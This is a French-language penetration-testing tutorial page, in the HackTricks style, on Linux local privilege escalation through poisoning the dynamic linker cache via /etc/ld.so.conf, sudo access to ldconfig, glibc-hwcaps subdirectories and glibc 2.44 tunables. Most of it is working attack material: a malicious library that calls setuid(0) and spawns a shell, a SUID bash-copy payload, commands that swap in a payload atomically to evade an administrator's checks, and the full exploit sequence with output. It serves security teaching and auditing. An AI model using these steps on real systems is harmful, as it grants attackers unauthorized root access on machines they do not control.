# Exemple d'exploit de privesc ld.so

{{#include ../../banners/hacktricks-training.md}}

Cette page est un lab ciblé sur l'empoisonnement du **cache du linker système via `/etc/ld.so.conf` ou `ldconfig`**. Pour l'injection de bibliothèques manquantes, les `RPATH`/`RUNPATH` accessibles en écriture, `LD_PRELOAD` et autres abus génériques du linker SUID, consultez [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Préparer l'environnement

Dans la section suivante, vous trouverez le code des fichiers que nous allons utiliser pour préparer l'environnement.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Créez** ces fichiers sur votre machine dans le même dossier
2. **Compilez la** **library** : `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copiez** `libcustom.so` dans `/usr/lib` et actualisez le cache : `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilèges root)
4. **Compilez l'****executable** : `gcc sharedvuln.c -o sharedvuln -lcustom`

### Vérifiez l'environnement

Vérifiez que _libcustom.so_ est **chargée** depuis _/usr/lib_ et que vous pouvez **exécuter** le binaire.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Commandes utiles de triage

Lors de l'attaque d'une cible réelle, vérifiez le **nom exact de la bibliothèque** dont le binaire a besoin, ce que le loader **résout actuellement**, et quels chemins configurés sont accessibles en écriture sans modifier le cache actif.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Utilisez `ldd` uniquement sur un exécutable **de confiance**. Certaines implémentations ou certains interpréteurs ELF inhabituels peuvent l'amener à exécuter du code contrôlé par un attaquant ; `objdump -p ./file | grep NEEDED` liste de manière sûre les dépendances directes. Pour une cible de confiance, l'invocation de l'interpréteur découvert avec `--list` affiche la résolution effective. Comparez cette sortie avec `--inhibit-cache --list` : une différence prouve que `/etc/ld.so.cache`, plutôt qu'une règle ordinaire de chemin de recherche, a sélectionné l'objet.<sup>[[1]](#references)[[4]](#references)</sup>

Quelques pièges utiles :

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **ne fonctionne généralement pas**, car
la redirection est effectuée par votre shell actuel. Utilisez plutôt
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Les binaires **SUID/privilégiés** s'exécutent en **mode d'exécution sécurisé** : `LD_LIBRARY_PATH`
est ignoré, tandis que `LD_PRELOAD` est restreint (les noms contenant une barre oblique sont
ignorés, et seules les bibliothèques marquées setuid dans les répertoires standard peuvent être
préchargées). Une fois que root exécute `ldconfig`, les répertoires listés dans
`/etc/ld.so.conf` peuvent être ajoutés à `/etc/ld.so.cache`, et cette mauvaise configuration peut
donc tout de même affecter les programmes privilégiés.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` est également ignoré en mode d'exécution sécurisé, sauf si `/etc/suid-debug` existe ; recueillez donc
sa trace lors d'une exécution non-SUID équivalente plutôt que d'attendre une sortie de l'exécution
privilégiée.<sup>[[1]](#references)</sup>
- Dans glibc 2.33 et les versions ultérieures, le chargeur dynamique expose également
`--list-diagnostics`, qui affiche des diagnostics lisibles par machine ainsi que les informations sur les chemins
de recherche intégrés lorsqu'un hijack ne se comporte pas comme prévu.<sup>[[1]](#references)[[6]](#references)</sup>

### Contraintes du cache et de SONAME

`ldconfig` ne met pas en cache tous les fichiers arbitraires d'un répertoire configuré : il examine les en-têtes ELF, reconnaît les noms correspondant à `lib*.so*` ou `ld-*.so*`, et attend la chaîne conventionnelle `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. L'objet injecté doit donc avoir l'architecture/classe cible, le nom exact de `DT_NEEDED` (normalement son `DT_SONAME`), ainsi que tous les symboles/versions que la victime résout.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Préférez une library spécifique à la cible, comme dans cet exemple. L'ombrage d'un SONAME courant avec un objet incomplet peut interrompre chaque processus qui le résout avant l'exécution de la cible privilégiée.<sup>[[3]](#references)</sup>

### Persistance des chemins mis en cache et swaps atomiques

Le cache enregistre une correspondance **nom de library vers chemin** ; il n'intègre pas l'objet partagé. Une fois qu'un chemin contrôlé par l'attaquant est mis en cache, le remplacement de l'objet à cet emplacement exact affecte les processus nouvellement démarrés sans autre exécution de `ldconfig`. Cela permet un pattern utile de time-of-check/time-of-use : exposer une library valide pendant la reconstruction ou l'inspection du cache par un administrateur, puis renommer atomiquement le payload par-dessus. Les processus existants conservent leur objet déjà mappé.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
De même, supprimer la ligne malveillante de `ld.so.conf` n’évince pas à lui seul une entrée déjà écrite : l’administrateur doit supprimer l’objet non fiable, corriger la propriété et l’accès en écriture, puis reconstruire le cache. Utilisez la comparaison `--inhibit-cache` ci-dessus pour distinguer une entrée obsolète du cache d’un chemin de configuration toujours actif.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Dans ce scénario, supposons qu’un administrateur ait ajouté une entrée vulnérable dans un fichier situé sous `/etc/ld.so.conf.d/`, inclus par le fichier système
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Le dossier vulnérable est _/home/ubuntu/lib_ (où nous avons un accès en écriture).\
**Téléchargez et compilez** le code suivant dans ce chemin :
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si vous vous attendez à ce que **root** (ou un autre compte privilégié) exécute ultérieurement le binaire vulnérable, il est généralement préférable de laisser un **artefact appartenant à root** plutôt que de lancer un shell interactif. Par exemple :
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ensuite, une fois l'exécution privilégiée effectuée, vous pouvez utiliser `/tmp/rootbash -p`.

Maintenant que nous avons **créé la bibliothèque malveillante libcustom dans le chemin mal configuré**, le cache par défaut doit être reconstruit par une exécution réussie et privilégiée de **`ldconfig`**. Un redémarrage n'est utile que lorsque le processus de démarrage local l'exécute effectivement ; sinon, attendez l'intervention d'un administrateur ou utilisez une règle sudo dangereuse si elle est disponible.<sup>[[2]](#references)</sup>

Une fois cette opération effectuée, **vérifiez à nouveau** depuis quel emplacement l'exécutable `sharedvuln` charge la bibliothèque `libcustom.so` :
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Comme vous pouvez le voir, il le charge depuis `/home/ubuntu/lib` et si un utilisateur l’exécute, un shell sera exécuté :
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Notez que dans cet exemple, nous n'avons pas escaladé les privilèges, mais en modifiant les commandes exécutées et en **attendant qu'un utilisateur root ou un autre utilisateur privilégié exécute le binaire vulnérable**, nous pourrons escalader les privilèges.

### Shadowing `glibc-hwcaps` moderne

Depuis glibc 2.33, le loader peut préférer les bibliothèques optimisées situées sous `glibc-hwcaps/<level>/` dans **chaque répertoire de recherche de bibliothèques**. Par conséquent, vérifier uniquement `/home/ubuntu/lib` est insuffisant : un sous-répertoire compatible et inscriptible tel que `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` peut faire de l'ombre à la bibliothèque de base après que `ldconfig` l'a indexé, tandis que les autres CPU continuent d'utiliser l'objet de base. Cela fournit également un hijack sélectif selon l'architecture, qui peut passer inaperçu lorsque la validation est effectuée sur un autre CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Les recommandations actuelles de hardening de glibc préconisent d’éviter les SONAME dupliqués, les emplacements de recherche non par défaut et les objets dans les sous-répertoires `glibc-hwcaps`. Du point de vue de l’audit, appliquez récursivement les vérifications de propriété et d’écriture aux répertoires configurés ainsi qu’à leurs composants de chemin parents.<sup>[[3]](#references)</sup>

### Autres mauvaises configurations - Même vulnérabilité

Dans l’exemple précédent, nous avons simulé une mauvaise configuration dans laquelle un administrateur **a défini un dossier non privilégié dans un fichier de configuration situé dans `/etc/ld.so.conf.d/`**.\
Mais d’autres mauvaises configurations peuvent provoquer la même vulnérabilité : si vous disposez de **permissions d’écriture** dans un **fichier de configuration** chargé, si vous pouvez créer un fichier dans un répertoire `/etc/ld.so.conf.d/` accessible en écriture, ou si vous pouvez écrire dans `/etc/ld.so.conf`, vous pouvez configurer et exploiter la même vulnérabilité.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Supposons que vous disposez de privilèges sudo sur `ldconfig`**. `ldconfig` accepte les répertoires à analyser comme arguments positionnels ; la forme la plus courte de cache-poisoning est donc souvent simplement :<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternativement, `-f` sélectionne un autre fichier de configuration tout en conservant la sortie du cache par défaut. Cela est utile lorsqu’un filtre d’arguments bloque les répertoires positionnels, mais autorise toujours `-f`, ou lorsque plusieurs chemins doivent être injectés :<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Maintenant, comme indiqué dans l'**exploit précédent**, **créez la bibliothèque malveillante dans `/tmp`**.\
Et enfin, chargeons le chemin et vérifions d'où le binaire charge la bibliothèque :
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Comme vous pouvez le voir, disposer de privilèges sudo sur `ldconfig` permet d'exploiter la même vulnérabilité.** Les détails des options sont importants lors de l'évaluation d'une règle sudo restreinte : `-f` sélectionne une autre configuration, mais reconstruit tout de même `/etc/ld.so.cache` ; `-C` redirige le cache ailleurs ; `-N` empêche la reconstruction du cache ; et `-X` empêche la mise à jour des liens, mais **reconstruit tout de même le cache sauf s'il est combiné avec `-N`**. `-n` implique `-N` : il peut donc mettre à jour les liens dans les répertoires fournis, mais ne peut pas empoisonner le cache ; `-r` s'exécute sous une autre racine et ne modifie normalement pas le cache de l'hôte.<sup>[[2]](#references)</sup>

## glibc 2.44 : tunables système mis en cache

À partir de glibc 2.44, `ldconfig` analyse également `/etc/tunables.conf` et stocke ses paramètres sous forme d'extension dans `/etc/ld.so.cache`. Le fichier accepte les directives `include` et les filtres par processus. Les préfixes contrôlent la portée : `@` cible uniquement les processus `AT_SECURE`, `$` les exclut, et `*` les couvre tous les deux. Cela étend le périmètre d'audit au-delà des répertoires de bibliothèques : une configuration de tunables accessible en écriture ou un fichier inclus peut influencer les futurs démarrages de programmes après une reconstruction privilégiée du cache.<sup>[[7]](#references)</sup>

La même version ajoute `ldconfig -t TUNCONF`, qui sélectionne un autre fichier de tunables tout en écrivant le cache normal, sauf si une autre option le modifie. Par conséquent, les wrappers et les règles sudo qui tentaient de bloquer uniquement `-f` doivent également refuser `-t`, les répertoires positionnels arbitraires et la manipulation de la sortie du cache.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Ce n'est pas automatiquement une exécution de code arbitraire. Il s'agit d'une primitive privilégiée de **loader-behavior manipulation** : glibc avertit explicitement que les valeurs à l'échelle du système peuvent appliquer des tunables sensibles à la sécurité aux programmes setuid/setgid sans vérification de sécurité individuelle pour chaque tunable. Énumérez les tunables réellement disponibles sur l'hôte avec `--list-tunables` et recherchez des modifications spécifiques de l'allocator cible, des changements de CPU-hardening ou des conditions de denial-of-service, plutôt que de supposer l'existence d'un payload universel.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Page du manuel Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Page du manuel Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening du Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Page du manuel Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (Utilitaires binaires GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostics du Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Tunables à l'échelle du système (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Ajouter des tunables à l'échelle du système : partie ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
